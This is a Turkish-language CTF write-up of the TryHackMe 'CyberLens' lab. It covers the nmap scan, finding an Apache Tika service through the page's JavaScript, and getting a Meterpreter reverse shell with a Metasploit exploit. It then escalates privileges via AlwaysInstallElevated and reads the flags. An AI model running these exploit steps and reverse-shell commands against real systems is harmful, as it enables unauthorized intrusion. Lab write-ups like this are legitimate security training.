---
title: 'TryHackMe | CyberLens WriteUp'
author: appdone
categories: [TryHackMe Challenges]
render_with_liquid: false
media_subpath: /images/tryhackme_cyberlens/
image:
  path: logo.webp
---

Bu yazımda, TryHackMe platformunda yer alan "CyberLens" isimli meydan okumayı çözeceğiz. Öncelikle hedefi tanımak adına nmap ile bir port taraması yapalım. Daha sonra açık portlara ve üzerinde çalışan servislere göre yolumuzu çizmeye başlayabiliriz.

```console
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 05:34 EDT
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2025-03-15T09:33:29
|_Not valid after:  2025-09-14T09:33:29
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-16T09:35:12+00:00
|_ssl-date: 2025-03-16T09:35:20+00:00; +3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

SMB servisine misafir olarak bağlanamadığımdan doğrudan web uygulamasına yöneleceğim.

![upload form](1.webp){: width="900" height="500" }

Web uygulamasında resimlerden meta verilerini çıkaran bir form var ama çalışmıyor. Sayfanın kaynak kodunu görüntülediğimizde aşağıdaki javascript kodu ile karşılaşıyoruz.

```js
document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("metadataButton").addEventListener("click", function() {
        var fileInput = document.getElementById("imageFileInput");
        var file = fileInput.files[0];

        var reader = new FileReader();
        reader.onload = function() {
            var fileData = reader.result;

            fetch("http://cyberlens.thm:61777/meta", {
                method: "PUT",
                body: fileData,
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/octet-stream"
                }
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error("Error: " + response.status);
                }
            })
            .then(data => {
                var metadataOutput = document.getElementById("metadataOutput");
                metadataOutput.innerText = JSON.stringify(data, null, 2);
            })
            .catch(error => {
                console.error("Error:", error);
            });
        };

        reader.readAsArrayBuffer(file);
    });
});
```

Kodu incelediğimizde 61777 numaralı port’a bir PUT isteğinde bulunduğunu görüyoruz. Girilen dosya bu sayfaya gönderiliyor.

![web server](2.webp){: width="900" height="500" }

Gördüğünüz üzere apache tika adında bir servis çalışıyor. Bu servisi sürümüyle beraber internette arattığımızda bir [github](https://www.rapid7.com/db/modules/exploit/windows/http/apache_tika_jp2_jscript/) sayfası ile karşılaşıyoruz.

Metasploit üzerinde bu servisi sömürebileceğimiz bir exploit bulunuyor. Exploit'i kullanmadan da bağlantı elde edebiliriz, ancak "windows exploit suggester" modülünü kullanacağım için metasploit'i kullanacağım.

```console
...
[*] Sending PUT request to 10.10.231.162:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (177734 bytes) to 10.10.231.162
[*] Meterpreter session 1 opened (10.21.66.61:4444 -> 10.10.231.162:49759) at 2025-03-16 05:45:45 -0400

(Meterpreter 1)(C:\Windows\system32) >
```

Bağlantı elde ettikten sonra C:\Users\CyberLens\Desktop dizininden kullanıcı bayrağını aldım ve nasıl yetki yükseltebileceğimi öğrenmek için "post/multi/recon/local_exploit_suggester" modülünü kullandım.

```console
...
[+] 10.10.231.162 - exploit/windows/local/always_install_elevated: The target is vulnerable.
...
```

Kontroller sonucunda "always install elevated" ayarının açık olduğunu öğrendim. Bu ayar normal kullanıcıların yönetici yetkisiyle dosya yükleyebilmesini sağlıyor. Tekrar metasploit üzerinde bulunan exploit’i kullanacağım.

```console
(Meterpreter 1)(C:\Windows\system32) > run exploit/windows/local/always_install_elevated LHOST=tun0 LPORT=1234
[*] Started reverse TCP handler on 10.21.66.61:1234 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\hqrKiig.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 10.10.231.162
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\hqrKiig.msi
[*] Meterpreter session 2 opened (10.21.66.61:1234 -> 10.10.231.162:49781) at 2025-03-16 05:49:48 -0400
[*] Session 2 created in the background.
```

Exploit'i çalıştırdıktan sonra yönetici yetkisinde bir oturum açılıyor. Yönetici bağlantısının olduğu oturuma geçtikten sonra masaüstünden son bayrağı alıyoruz.

```console
(Meterpreter 2)(C:\Users\Administrator\Desktop) > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  24    fil   2023-11-27 14:50:45 -0500  admin.txt
100666/rw-rw-rw-  282   fil   2021-03-17 11:13:27 -0400  desktop.ini

(Meterpreter 2)(C:\Users\Administrator\Desktop) > cat admin.txt 
THM{***}
```
